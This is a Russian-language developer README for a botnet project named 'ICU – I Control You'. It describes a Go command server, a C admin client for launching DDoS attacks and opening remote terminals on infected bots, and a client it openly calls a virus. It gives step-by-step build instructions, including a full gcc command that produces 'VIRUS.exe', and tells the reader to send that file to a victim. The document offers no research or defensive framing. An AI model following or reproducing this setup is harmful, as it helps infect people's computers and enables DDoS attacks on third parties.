# `ICU` I Control You

# Документация разработчиков (Русская версия)

## Основнные папки (их использование)

-   server - Папка `server` предназначена для разработки и запуска самого сервера(Golang) к которому будут стучаться боты(ПК). Сервер принимает пакеты от админ части и от ботов(ПК) а также отправляет соответствующие пакеты.
-   admin - Папка `admin` админ части(C), отправка пакет начало DDoS атаки, контролирование ботов(ПК), получение отчетов, проведение тестирования на активности и получение удаленного доступа к терминалу бота.
-   sys - Папка `sys` написанная(C) компилируется в .exe файлы которые нужны отправляет потенциальным пользователем для заражения. (Windows/Linux)

## Скачивания на свой ПК

1. Сделайте fork или clone репозиторий с ветки (main или последней версии)

## Запуск сервера (Golang)

1. Для запуска сервера перейдите к директории `cd server`.
2. Установите Golang язык на свой компьютер например с сайта (- v1.23.0) - https://go.dev/doc/install
3. Создайте файл .env с переменными указаными в .env.example
4. После чего запустите сервера напрмимер `make run` или `go run main.go`

## Запуск клиента admin (C)

1. Для запуска клиента admin перейдите к директории `cd admin/source`.
2. Запустите уже готовый exe файл!

## Запуск клиента бота (C)

`cd sys/windows` - Основная директория САМОГО ВИРУСА - отправьте файл exe в `cd sys/windows/source` жертве!

1. Для получения бота перейдите к директории `cd sys/windows`.

### Если вы на windows

1. Скачайте gcc компилятор - [Ссылка установки](https://programforyou.ru/poleznoe/kak-ustanovit-gcc-dlya-windows?ysclid=ma6mecgzgl891843266)
2. Установите make - [Ссылка установки](https://www.gnu.org/software/make/#download) - после чего выполните `make exe`
   2.1. Или запустите в терминале:

```bash
gcc x86_x64.c -o "source/VIRUS.exe" stdlib/ICU_log.c core/ICU_bot.c stdlib/ICU_ipgeo.c stdlib/ICU_env.c stdlib/crc.c stdlib/ICU_packet.c stdlib/ICU_dos.c process/windowsprocess.c process/recyclebinprocess.c process/dirprocess.c -mwindows -lws2_32 -lwinhttp -liphlpapi -lshell32 -lole32 -luuid
```

2. После чего перейдите в `cd sys/windows/windows`, готово! вы найдете файл exe

